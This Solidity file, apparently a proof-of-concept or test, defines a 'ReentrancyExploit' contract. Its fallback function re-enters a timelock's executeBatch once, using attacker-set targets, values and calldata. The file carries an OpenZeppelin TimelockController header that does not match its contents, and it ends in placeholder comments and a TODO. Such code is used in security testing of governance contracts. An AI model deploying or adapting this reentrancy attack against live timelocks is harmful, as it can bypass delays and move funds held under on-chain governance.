// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (governance/TimelockController.sol)

pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;


import "../access/AccessControl.sol";

interface ITimelock {
    function executeBatch(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata datas,
        bytes32 predecessor,
        bytes32 salt
    ) external; 
}

contract ReentrancyExploit {

  bytes32 public id;

  address[] targets;
  uint256[] values;
  bytes[] datas;
  bytes32 predecessor;
  bytes32 salt;

  bool public hasReentered;

  bytes public moreData;

  function setData (
    bytes32 newId, 
    address[] memory newTargets, 
    uint256[] memory newValues,
    bytes[] memory newDatas,
    bytes32 newPredecessor,
    bytes32 newSalt
  ) external {
    id = newId;
    targets = newTargets;
    values = newValues;
    datas = newDatas;
    predecessor = newPredecessor;
    salt = newSalt;
  }

  function setMoreData(bytes calldata newMoreData) external {
    moreData = newMoreData;
  }

  // Set Payload to Re-send

  // Receive

  // Set as done (so we don't reEnter twice, obv can be changed to reEnter X times)

  // Do the reEntrancy


  fallback() external payable {
    ITimelock target = ITimelock(msg.sender); // The caller is the timelock

    if(!hasReentered) {
      hasReentered = true;
      target.executeBatch(
          targets,
          values,
          datas,
          predecessor,
          salt);
    }

    // TODO: 
  }
}